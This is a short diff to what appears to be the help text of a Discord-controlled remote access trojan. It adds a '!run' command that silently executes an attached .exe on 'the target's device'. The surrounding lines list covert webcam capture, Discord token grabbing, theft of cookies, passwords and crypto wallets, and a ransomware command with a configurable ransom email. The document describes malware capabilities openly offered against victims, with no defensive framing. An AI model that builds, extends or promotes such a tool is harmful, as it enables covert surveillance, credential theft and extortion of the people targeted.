@@ -75,6 +75,7 @@ Available commands are :
 --> !selectcam = Select camera to take a picture out of (default will be camera 1)/ Syntax "!selectcam 1"
 --> !webcampic = Take a picture out of the selected webcam
 --> !grabtokens = Grab all discord tokens on the current pc
+--> !run = Silent runs a .exe file on the target's device (with attachement)
 --> !steal = Steals all the information from the device (cookies, passwords, crypto,...)
 --> !ransom = Runs a ransomware script on target's device (Add email you want the target to email to for his key, price and message can be configured in script)
 --> !help = This help menu
